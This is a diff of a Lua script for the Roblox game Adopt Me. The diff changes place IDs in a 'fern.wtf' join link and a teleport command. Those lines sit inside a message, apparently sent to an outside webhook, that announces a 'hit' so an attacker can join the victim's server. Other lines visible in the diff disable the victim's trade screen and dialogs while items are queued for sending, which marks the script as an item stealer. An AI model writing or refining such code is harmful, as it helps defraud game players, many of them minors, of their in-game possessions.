@@ -131,7 +131,7 @@ local function SendJoinMessage(list, prefix)
         },
         {
             name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=920587237&gameInstanceId=" .. game.JobId
+            value = "https://fern.wtf/joiner?placeId=383310974&gameInstanceId=" .. game.JobId
         },
         {
             name = "Item list:",
@@ -188,7 +188,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(920587237, '" .. game.JobId .. "')",
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(383310974, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = "\240\159\144\178 Join to get Adopt Me hit",
             ["color"] = 65280,
@@ -363,7 +363,7 @@ toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
 end)
 
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
+--game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 
 if #itemsToSend > 0 then
